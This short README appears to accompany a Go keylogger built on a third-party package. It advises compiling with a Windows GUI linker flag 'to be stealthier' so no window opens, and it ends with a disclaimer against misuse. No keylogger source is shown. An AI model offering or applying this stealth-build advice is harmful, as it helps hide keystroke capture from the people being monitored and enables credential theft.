A quick golang keylogger using this usefull package : github.com/kindlyfire/go-keylogger
To be stealthier, mind using -ldflags -H=windowsgui flags when compiling your go code. (so it wont open a window on windows only)
like :
go build -ldflags -H=windowsgui main.go
Please do not use this program in order to attack or harm anyone.
I am not responsible for any harm done with this code. 
